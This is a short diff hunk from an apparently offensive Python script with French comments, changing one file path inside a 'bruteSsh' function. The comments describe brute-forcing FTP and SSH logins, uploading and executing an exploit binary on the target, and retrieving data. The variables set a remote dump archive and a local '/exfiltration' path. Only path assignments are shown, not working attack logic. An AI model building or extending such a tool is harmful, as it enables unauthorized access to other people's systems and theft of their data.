@@ -183,7 +183,7 @@ def bruteFTP(ip): #bruteforce FTP + récuperation de données
 
 def bruteSsh(ip): #BruteForce SSH + envoi de binaires + execution + récupération de données
 	exec_dir = ""
-	source = '/exploit_loco.exe'
+	source = '/exploit-loco.exe'
 	destination ='/home/Admin/Desktop/exploit_locale.exe'
 	remotezip='/home/Admin/Desktop/ZipDump.zip'
 	tolocalzip='/exfiltration/ZipDump.zip'
